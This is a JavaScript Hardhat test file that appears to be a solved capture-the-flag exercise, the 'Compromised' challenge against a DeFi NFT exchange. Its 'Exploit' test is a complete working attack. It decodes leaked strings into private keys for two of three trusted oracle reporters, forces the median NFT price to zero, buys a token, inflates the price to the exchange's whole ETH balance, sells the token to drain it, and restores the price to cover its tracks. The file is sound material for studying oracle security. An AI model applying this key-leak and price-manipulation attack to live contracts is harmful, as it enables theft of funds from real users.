const { expect } = require('chai');
const { ethers } = require('hardhat');

describe('Compromised challenge', function () {

    const sources = [
        '0xA73209FB1a42495120166736362A1DfA9F95A105',
        '0xe92401A4d3af5E446d93D11EEc806b1462b39D15',
        '0x81A5D6E50C214044bE44cA0CB057fe119097850c'
    ];

    let deployer, attacker;
    const EXCHANGE_INITIAL_ETH_BALANCE = ethers.utils.parseEther('9990');
    const INITIAL_NFT_PRICE = ethers.utils.parseEther('999');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, attacker] = await ethers.getSigners();

        const ExchangeFactory = await ethers.getContractFactory('Exchange', deployer);
        const DamnValuableNFTFactory = await ethers.getContractFactory('DamnValuableNFT', deployer);
        const TrustfulOracleFactory = await ethers.getContractFactory('TrustfulOracle', deployer);
        const TrustfulOracleInitializerFactory = await ethers.getContractFactory('TrustfulOracleInitializer', deployer);

        // Initialize balance of the trusted source addresses
        for (let i = 0; i < sources.length; i++) {
            await ethers.provider.send("hardhat_setBalance", [
                sources[i],
                "0x1bc16d674ec80000", // 2 ETH
            ]);
            expect(
                await ethers.provider.getBalance(sources[i])
            ).to.equal(ethers.utils.parseEther('2'));
        }

        // Attacker starts with 0.1 ETH in balance
        await ethers.provider.send("hardhat_setBalance", [
            attacker.address,
            "0x16345785d8a0000", // 0.1 ETH
        ]);
        expect(
            await ethers.provider.getBalance(attacker.address)
        ).to.equal(ethers.utils.parseEther('0.1'));

        // Deploy the oracle and setup the trusted sources with initial prices
        this.oracle = await TrustfulOracleFactory.attach(
            await (await TrustfulOracleInitializerFactory.deploy(
                sources,
                ["DVNFT", "DVNFT", "DVNFT"],
                [INITIAL_NFT_PRICE, INITIAL_NFT_PRICE, INITIAL_NFT_PRICE]
            )).oracle()
        );

        // Deploy the exchange and get the associated ERC721 token
        this.exchange = await ExchangeFactory.deploy(
            this.oracle.address,
            { value: EXCHANGE_INITIAL_ETH_BALANCE }
        );
        this.nftToken = await DamnValuableNFTFactory.attach(await this.exchange.token());
    });

    it('Exploit', async function () {        
        /** CODE YOUR EXPLOIT HERE */
        /* 
            Vulnerability:
            The "strange response" represents the raw bytes for the private keys to 2 of the 3 
            "trusted reporters". These are used by the attacker to gain access to the trusted 
            reporters, lower the price of the nft to 0, purchase an nft, then raise the price of
            an nft to the exchange's eth balance, sell the nft for the exchange's balance, and
            then reset the price of an nft back to it's initial value.
        */

        // Store the initial nft price so that it can be reset later
        const initialNftPrice = await this.oracle.getMedianPrice("DVNFT")

        // Convert the "strange response" strings to private keys and then to signers
        const rawPrivateKey1 = "4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35"
        const rawPrivateKey2 = "4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34"

        const privateKey1 = rawStringToPrivateKey(rawPrivateKey1) 
        const privateKey2 = rawStringToPrivateKey(rawPrivateKey2) 

        const signer1 = new ethers.Wallet(privateKey1, ethers.provider)
        const signer2 = new ethers.Wallet(privateKey2, ethers.provider)

        // Lower the median price of an nft to 0
        await this.oracle.connect(signer1).postPrice("DVNFT", 0)
        await this.oracle.connect(signer2).postPrice("DVNFT", 0)

        // Purchase an nft and get it's tokenId
        const tx = await this.exchange.connect(attacker).buyOne({ value: 1 })
        const receipt = await tx.wait()
        const tokenId = receipt.events[1].args.tokenId
   
        // Raise the price of an nft to the exchange's eth balance
        const exchangeBalance = await ethers.provider.getBalance(this.exchange.address)

        await this.oracle.connect(signer1).postPrice("DVNFT", exchangeBalance)
        await this.oracle.connect(signer2).postPrice("DVNFT", exchangeBalance)

        // Sell the nft back to the exchange and receive the exchange's eth balance
        await this.nftToken.connect(attacker).approve(this.exchange.address, tokenId)
        await this.exchange.connect(attacker).sellOne(tokenId)

        // Reset the nft price
        await this.oracle.connect(signer1).postPrice("DVNFT", initialNftPrice)
        await this.oracle.connect(signer2).postPrice("DVNFT", initialNftPrice)
    });

    function rawStringToPrivateKey(str) {
        const base64 = Buffer.from(str.split(" ").join(""), "hex").toString("utf8")
        return Buffer.from(base64, "base64").toString("utf8")
    }

    after(async function () {
        /** SUCCESS CONDITIONS */
        
        // Exchange must have lost all ETH
        expect(
            await ethers.provider.getBalance(this.exchange.address)
        ).to.be.eq('0');
        
        // Attacker's ETH balance must have significantly increased
        expect(
            await ethers.provider.getBalance(attacker.address)
        ).to.be.gt(EXCHANGE_INITIAL_ETH_BALANCE);
        
        // Attacker must not own any NFT
        expect(
            await this.nftToken.balanceOf(attacker.address)
        ).to.be.eq('0');

        // NFT price shouldn't have changed
        expect(
            await this.oracle.getMedianPrice("DVNFT")
        ).to.eq(INITIAL_NFT_PRICE);
    });
});
